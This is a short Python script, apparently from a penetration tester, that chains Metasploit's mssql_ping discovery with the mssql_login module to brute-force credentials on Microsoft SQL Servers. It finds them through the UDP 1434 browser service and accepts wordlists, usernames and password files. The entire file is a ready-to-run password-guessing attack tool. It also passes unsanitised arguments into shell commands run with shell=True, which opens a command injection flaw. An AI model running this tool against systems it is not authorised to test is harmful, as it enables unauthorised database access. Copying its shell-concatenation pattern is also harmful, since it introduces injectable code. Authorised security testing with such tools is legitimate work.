#!/usr/bin/env python
'''
@author: Matthew C. Jones, CPA, CISA, OSCP, CCFE
IS Audits & Consulting, LLC
TJS Deemer Dana LLP

-------------------------------------------------------------------------------

Chain together metasploit mssql_ping and brute force to allow direct brute
forcing of MSSQL servers using browser service on UDP 1434

-------------------------------------------------------------------------------

TODO - dunno?

'''

import sys
import argparse
import subprocess
import re

def main(argv):
    
    parser = argparse.ArgumentParser(description='Find SQL servers using msf mssql_ping and brute force em')
    parser.add_argument("--wordlist", "-w", default="", action="store", help='wordlist in user:pass format')
    parser.add_argument("--username", "-u", default="", action="store", help='username')
    parser.add_argument("--password", "-p", default="", action="store", help='password')
    parser.add_argument("--userfile", "-U", default="", action="store", help='user file')
    parser.add_argument("--passfile", "-P", default="", action="store", help='password file')
    parser.add_argument("--domain", "-d", default="", action="store", help='domain / workgroup to use for windows authentication')
    parser.add_argument("target", action="store", help="target")
    args = parser.parse_args()
    
    wordlist = args.wordlist
    username = args.username
    password = args.password
    userfile = args.userfile
    passfile = args.passfile
    domain = args.domain
    target = args.target
    
    # Regex to escape ANSI color codes in metasploit output
    # See https://stackoverflow.com/questions/14693701/how-can-i-remove-the-ansi-escape-sequences-from-a-string-in-python
    # Color codes only - r'\x1B\[[0-?]*[ -/]*[@-~]'
    # All ANSI escape codes - r'(\x9B|\x1B\[)[0-?]*[ -/]*[@-~]'
    ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
    
    command = "msfconsole -q -n -x '" \
              "use auxiliary/scanner/mssql/mssql_ping;" \
              "set RHOSTS " + target + ";" \
              "run;" \
              "exit -y'"
    
    print(command)
    
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = process.communicate()
    
    output = ansi_escape.sub('',output)
    print(output)
    
    # returns a list of tuples with ip & port, e.g.
    # [('10.54.76.2', '64599'), ('10.54.76.130', '60820')]
    p = re.compile('information for (\d*\.\d*\.\d*\.\d*)[\s\S]+?tcp\s*=\s*(\d*)')
    result = p.findall(output)
    
    for host, port in result:
        
        command = "msfconsole -q -n -x '" \
                  "use auxiliary/scanner/mssql/mssql_login;" \
                  "set RHOSTS " + host + ";" \
                  "set RPORT " + port + ";" \
                  "set DOMAIN " + domain + ";"
        if domain:
            command = command + "set USE_WINDOWS_AUTHENT true;"
        
        # either going to use a userpass file or a combination of username/userfile/password/passfile
        if wordlist:
            command += "set USERPASS_FILE " + wordlist + ";"
        
        else:
            if username or userfile:
                if username:
                    command += "set USERNAME " + username + ";"
                elif userfile:
                    command += "set USER_FILE " + userfile + ";"
            
            if password or passfile:
                if password:
                    command += "set PASSWORD " + password + ";"
                elif passfile:
                    command += "set PASS_FILE " + passfile + ";"
            
            
        command += "run; exit -y'"
        
        print(command)
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output, error = process.communicate()
        
        output = ansi_escape.sub('',output)
        print(output)
    
if __name__ == "__main__":
    main(sys.argv[1:])